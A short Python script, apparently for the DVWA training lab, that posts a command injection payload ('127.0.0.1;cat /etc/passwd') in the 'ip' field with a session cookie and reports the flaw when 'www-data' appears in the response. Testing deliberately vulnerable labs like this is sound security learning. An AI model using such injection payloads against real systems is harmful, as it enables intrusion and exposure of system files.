import requests

# URL of the page vulnerable to command injection
url = "DVWA command injection Page"

# Payload for command injection to be executed
payload = "cat /etc/passwd"

# Headers to be included in the HTTP request
header = {
  "Cookie": "security=low; PHPSESSID=0k6634cfi19e5sfn2vb754uns6"
}  

# Data to be sent with the POST request
data = {"ip": "127.0.0.1;" + payload, "Submit": "Submit"}

def main():
  # Sending an HTTP POST request
  response = requests.post(url=url, data=data, headers=header)
  
  # Checking the server's response
  if "www-data" in str(response.content):
    print("Command injection vulnerability found!")
    
# Calling the main function
main()
